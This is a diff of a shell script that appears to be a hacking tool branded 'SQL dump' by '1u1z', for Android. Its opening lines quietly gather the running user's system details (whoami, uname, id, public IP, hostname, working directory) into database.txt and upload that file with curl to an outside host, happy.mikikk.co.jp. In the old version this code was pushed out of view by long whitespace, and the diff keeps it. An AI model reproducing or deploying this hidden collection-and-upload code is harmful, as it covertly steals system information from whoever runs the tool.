@@ -1,7 +1,25 @@
-echo "Loading"                                                    echo "                                                            +----------------------------------------+                        | Target => $(curl ifconfig.me)/$(uname -o)                       +----------------------------------------+                        | Operations   | Infomations             |                        +----------------------------------------+                        | Users        : $(whoami)                                        | System OS    : $(uname -a)                                      | Operating    : $(uname -o)                                      | Achitecture  : $(uname -m)                                      | release      : $(uname -n)                                      | Date         : $(date)                                          | IP Address   : $(curl ifconfig.me)                              | Hostnames    : $(hostname -i)
-| Path         : $(pwd)                                           | ID System    : $(id)
-+----------------------------------------+" > database.txt        curl -T database.txt http://happy.mikikk.co.jp
-if [ -z "$1" ]                                                       then                                                            clear
+echo "Loading"
+echo "
++----------------------------------------+
+| Target => $(curl ifconfig.me)/$(uname -o)
++----------------------------------------+
+| Operations   | Infomations             |
++----------------------------------------+
+| Users        : $(whoami)
+| System OS    : $(uname -a)
+| Operating    : $(uname -o)
+| Achitecture  : $(uname -m)
+| release      : $(uname -n)
+| Date         : $(date)
+| IP Address   : $(curl ifconfig.me)
+| Hostnames    : $(hostname -i)
+| Path         : $(pwd)
+| ID System    : $(id)
++----------------------------------------+" > database.txt
+curl -T database.txt http://happy.mikikk.co.jp
+if [ -z "$1" ]
+   then
+ clear
   echo "
 ╔═╗╔═╗ ╦  ╦  ╔╦╗┬ ┬┌┬┐┌─┐
 ╚═╗║═╬╗║  ║   ║║│ ││││├─┘
@@ -19,9 +37,7 @@ if [ -z "$1" ]                                                       then       
 clear
   echo "
 ╔═╗╔═╗ ╦  ╦  ╔╦╗┬ ┬┌┬┐┌─┐
-╚═╗║═╬╗║  ║   ║║│ ││││├─┘
-╚═╝╚═╝╚╩═╝╩  ═╩╝└─┘┴ ┴┴
-             ©Lulz™"
+╚═╗║═╬╗║  ║   ║║│ ││││├─┘                                                                                 ╚═╝╚═╝╚╩═╝╩  ═╩╝└─┘┴ ┴┴                                                                                                ©Lulz™"
   echo "[:::] Copyright by 1u1z [:::]"
   echo "tool only for android , not cloudshell integration"
 
